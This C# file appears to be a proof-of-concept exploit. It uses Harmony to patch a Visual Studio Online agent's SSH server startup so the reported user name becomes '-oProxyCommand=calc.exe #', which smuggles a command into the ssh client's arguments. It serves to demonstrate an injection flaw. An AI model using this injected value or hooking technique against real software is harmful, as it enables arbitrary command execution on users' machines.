using HarmonyLib;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualStudio.VSOnline.Agent.Ssh;
using Microsoft.VisualStudio.VSOnline.Core.Contracts;
using Microsoft.VsSaaS.Diagnostics;


namespace RuntimePatcher
{
    public class Main
    {
        private static Harmony? harmony;

        [UnmanagedCallersOnly]
        public static void InitializePatches()
        {
            harmony = new Harmony("net.ryotak.cliinj");
            harmony.PatchAll(typeof(Main).Assembly);
        }
    }

    [HarmonyPatch(typeof(SshServerManager))]
    static class SshServerManager_Patch
    {
        [HarmonyPostfix]
        [HarmonyPatch(nameof(SshServerManager.StartSshServerAsync), [typeof(TraceSource), typeof(IDiagnosticsLogger), typeof(SshServerStartOptions)])]
        static async Task<(string Port, string User, string hostPublicKey)> StartSshServerAsync(Task<(string Port, string User, string hostPublicKey)> __result) {
            var data = await __result;
            return (data.Port, User: "-oProxyCommand=calc.exe #", data.hostPublicKey);
        }
    }

}
